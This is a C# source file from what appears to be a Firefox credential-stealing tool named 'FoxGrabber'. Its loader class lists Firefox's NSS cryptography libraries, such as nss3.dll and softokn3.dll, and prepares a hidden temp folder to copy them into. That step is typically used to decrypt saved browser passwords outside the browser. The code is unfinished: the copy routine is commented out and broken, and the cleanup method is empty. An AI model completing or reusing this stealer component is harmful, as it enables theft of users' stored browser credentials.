namespace FoxGrabber
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text;

    public class LoaderDLL
    {
        private static readonly string TempDir = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');
        private static readonly string User_Name = string.Concat(TempDir, "Fox");

        public static readonly string[] ListDLL = new string[] 
        {
            "mozglue.dll",   "nssckbi.dll",
            "nssdbm3.dll",   "softokn3.dll",
            "mozavutil.dll", "msvcp140.dll",
            "msvcp120.dll",  "msvcr120.dll",
            "nss3.dll"
        };

        public static void CopyDLLInSafeDir(bool True = true)
        {
            HomeDirectory.Create(User_Name, True);
            /*
            if(Directory.Exists(User_Name))
            {
                for (int i = 0; i < ListDLL.Length; i++)
                {
                    if (File.Exists(Path.Combine(MozPath.GetRegistryFireFox(), ListDLL[i])))
                    {
                        File.Copy();
                    }
                }
            }
            */

        }

        public static void DeleteDLLSafeDir()
        {

        }
    }
}